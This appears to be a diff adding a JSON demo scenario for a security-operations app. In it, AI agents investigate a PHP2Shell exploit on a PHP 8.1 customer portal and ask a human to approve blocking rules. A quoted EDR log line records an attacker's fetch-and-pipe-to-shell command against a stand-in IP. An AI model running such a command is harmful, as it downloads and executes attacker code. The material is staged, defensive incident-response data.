@@ -1,0 +1,216 @@
+{
+  "version": 1,
+  "title": "PHP2Shell on a portal PHP 8.1 can't patch",
+  "summary": "CVE-2026-109618 is exploited against a customer portal still on PHP 8.1, which has no upstream fix. The team proves the shell, keeps the work in the sidebar as tasks, and pins the Investigation while it runs.",
+  "clock": "10:42",
+  "appearance": "dark",
+  "champion": "Avery Lin",
+  "settings": {
+    "PionBackdropEffect": "grid",
+    "sidebarTasks": "allOpen"
+  },
+  "agents": [
+    {
+      "key": "margot",
+      "name": "Lunar Fox",
+      "harness": "claude-code",
+      "model": "opus",
+      "description": "Lead investigator",
+      "avatar": { "symbol": "star.fill", "color": 0 },
+      "status": { "phase": "working", "detail": "Waiting on Avery" },
+      "tasks": [
+        {
+          "title": "Approve the WAF rule for portal.example",
+          "in": "php2shell",
+          "on": "user",
+          "note": "Blocks oversized multipart requests to /upload until PHP is upgraded."
+        }
+      ]
+    },
+    {
+      "key": "rafe",
+      "name": "Quiet Lynx",
+      "harness": "codex",
+      "model": "gpt-5.2-codex",
+      "description": "Endpoints and EDR",
+      "avatar": { "symbol": "desktopcomputer", "color": 2 },
+      "status": { "phase": "working", "detail": "Inventorying PHP versions" },
+      "tasks": [
+        {
+          "title": "Find every server on PHP 8.1 or older",
+          "in": "fleet"
+        },
+        {
+          "title": "Image WEB-PORTAL-01 before isolation",
+          "in": "php2shell"
+        }
+      ]
+    },
+    {
+      "key": "theo",
+      "name": "Silver Kite",
+      "harness": "codex",
+      "model": "gpt-5.2-codex",
+      "description": "Network and DNS",
+      "avatar": { "symbol": "network", "color": 3 },
+      "status": { "phase": "ready", "detail": "Edge logs searched" },
+      "tasks": [
+        {
+          "title": "Block 203.0.113.77 at the edge",
+          "in": "php2shell",
+          "on": "user"
+        }
+      ]
+    },
+    {
+      "key": "sasha",
+      "name": "Indigo Moth",
+      "harness": "claude-code",
+      "model": "sonnet",
+      "description": "Threat intelligence",
+      "avatar": { "symbol": "binoculars.fill", "color": 4 },
+      "status": { "phase": "working", "detail": "Matching NCSC-NL indicators" },
+      "tasks": [
+        {
+          "title": "Match NCSC-NL indicators against proxy logs",
+          "in": "fleet"
+        }
+      ]
+    }
+  ],
+  "conversations": [
+    {
+      "key": "php2shell",
+      "pinned": true,
+      "group": {
+        "name": "PHP2Shell on WEB-PORTAL-01",
+        "members": ["margot", "rafe", "theo", "sasha"]
+      },
+      "messages": [
+        {
+          "at": "09:58",
+          "from": "user",
+          "text": "**INV-0061 is open: PHP2Shell on WEB-PORTAL-01**. @Lunar Fox leads.\n\nThe portal still runs PHP 8.1. Find out whether CVE-2026-109618 was used against it and what happened next."
+        },
+        {
+          "at": "10:06",
+          "from": "theo",
+          "text": "Edge logs show **38 oversized multipart POSTs to /upload** from 203.0.113.77 between 09:31 and 09:34, with no session cookie. Each ended in a 500."
+        },
+        {
+          "at": "10:12",
+          "from": "rafe",
+          "text": "Matching PHP-FPM errors on WEB-PORTAL-01, then a child process that should never be there:\n\n```\n09:33:52 PHP Fatal error: Allowed memory size of 134217728 bytes exhausted\n09:34:07 php-fpm: pool www → /bin/sh -c id; curl -s 203.0.113.77/k | sh\n09:34:09 www-data wrote /var/www/portal/public/.cache/img.php\n```"
+        },
+        {
+          "at": "10:19",
+          "from": "sasha",
+          "text": "That is the PHP2Shell pattern: memory exhaustion mid-request, then code running before any app code sees it, so the portal's login doesn't help. Fixed on 21 October in 8.5.12, 8.4.27, 8.3.36 and 8.2.35; **8.1 gets no upstream fix**. Exploited in the wild since the day of the fix. NCSC-NL keeps the operational notes and indicators:\n\nhttps://github.com/NCSC-NL/php2shell"
+        },
+        {
+          "at": "10:31",
+          "from": "margot",
+          "text": "I have moved this to **contained**: `img.php` is a web shell, and the box made one outbound call to 203.0.113.77. Two things for you, @Avery: approve the WAF rule blocking oversized multipart requests to `/upload`, and the edge block on 203.0.113.77. Both are in your tasks. Upgrading off 8.1 is the only real fix."
+        }
+      ],
+      "investigation": {
+        "number": 61,
+        "title": "PHP2Shell on WEB-PORTAL-01",
+        "objective": "Establish whether CVE-2026-109618 was exploited on the customer portal, what ran afterwards, and contain it.",
+        "severity": "critical",
+        "status": "contained",
+        "source": "EDR: shell spawned by php-fpm",
+        "opened": "09:58",
+        "lead": "margot",
+        "case": {
+          "entities": [
+            { "kind": "host", "name": "WEB-PORTAL-01", "detail": "Customer portal, PHP 8.1 on php-fpm", "at": "10:12", "by": "rafe" },
+            { "kind": "indicator", "name": "203.0.113.77", "detail": "Sent the exploit requests; served the second stage", "at": "10:06", "by": "theo" },
+            { "kind": "indicator", "name": "img.php", "detail": "Web shell in public/.cache, written 09:34", "at": "10:12", "by": "rafe" },
+            { "kind": "service", "name": "portal.example /upload", "detail": "Unauthenticated multipart endpoint", "at": "10:06", "by": "theo" }
+          ],
+          "evidence": [
+            { "source": "Cloudflare", "method": "HTTP requests to portal.example/upload, 09:00–10:00, body over 8 MB", "result": "38 POSTs from 203.0.113.77, 09:31–09:34, no session cookie, all 500.", "at": "10:06", "by": "theo" },
+            { "source": "CrowdStrike Falcon", "method": "Process tree under php-fpm on WEB-PORTAL-01 since 09:00", "result": "php-fpm spawned /bin/sh at 09:34:07, fetched a script from 203.0.113.77 and wrote img.php.", "at": "10:12", "by": "rafe" },
+            { "source": "Advisories", "method": "PHP release notes and NCSC-NL php2shell repository", "result": "Fixed in 8.5.12, 8.4.27, 8.3.36 and 8.2.35; no upstream fix for 8.1; exploited since 21 October.", "at": "10:19", "by": "sasha" }
+          ],
+          "findings": [
+            { "claim": "WEB-PORTAL-01 was exploited through CVE-2026-109618 without authentication, and a web shell was planted.", "evidence": ["V-1", "V-2"], "confidence": "high", "entities": ["WEB-PORTAL-01", "img.php"], "at": "10:24", "by": "margot" },
+            { "claim": "PHP 8.1 has no upstream fix, so the portal stays exposed until it is upgraded, whatever the WAF blocks.", "evidence": ["V-3"], "confidence": "high", "entities": ["WEB-PORTAL-01"], "at": "10:26", "by": "sasha" }
+          ]
+        }
+      }
+    },
+    {
+      "key": "fleet",
+      "pinned": true,
+      "group": {
+        "name": "PHP2Shell exposure across the web fleet",
+        "members": ["margot", "rafe", "sasha"]
+      },
+      "messages": [
+        {
+          "at": "10:15",
+          "from": "margot",
+          "text": "Opening this alongside INV-0061: if the portal was hit, anything else still on PHP 8.1 is next."
+        },
+        {
+          "at": "10:38",
+          "from": "rafe",
+          "text": "**14 of 52** web servers checked so far. Two more on 8.1 (`WEB-CMS-03`, `WEB-HR-02`); neither shows memory-exhaustion bursts yet."
+        }
+      ],
+      "investigation": {
+        "number": 62,
+        "title": "PHP2Shell exposure across the web fleet",
+        "objective": "Find every server still exposed to CVE-2026-109618 and check each for signs of exploitation.",
+        "severity": "high",
+        "status": "triaging",
+        "source": "Spun off from INV-0061",
+        "opened": "10:15",
+        "lead": "margot"
+      }
+    },
+    {
+      "key": "beacon",
+      "group": {
+        "name": "DNS beaconing from WH-SCAN-11",
+        "members": ["margot", "rafe", "theo"]
+      },
+      "messages": [
+        {
+          "at": "-1d 16:40",
+          "from": "theo",
+          "text": "WH-SCAN-11 resolves `a8f3.update-cdn-check.example` every 60 s since Monday. Nothing else on the network does."
+        }
+      ],
+      "investigation": {
+        "number": 56,
+        "title": "DNS beaconing from WH-SCAN-11",
+        "objective": "Find out why a warehouse scanner resolves a random-looking domain every 60 seconds.",
+        "severity": "medium",
+        "status": "triaging",
+        "source": "DNS analytics",
+        "opened": "-1d 16:40",
+        "lead": "margot"
+      }
+    }
+  ],
+  "linkPreviews": [
+    {
+      "url": "https://github.com/NCSC-NL/php2shell",
+      "title": "GitHub - NCSC-NL/php2shell: Operational information regarding the 2026 php2shell vulnerabilities"
+    }
+  ],
+  "present": {
+    "window": { "size": [1440, 880] },
+    "select": "php2shell",
+    "inspector": "hidden"
+  },
+  "timeline": [
+    { "capture": "01-tasks-and-pins" },
+    { "waitFor": "key" },
+    { "present": { "inspector": "case" } },
+    { "capture": "02-case" }
+  ]
+}
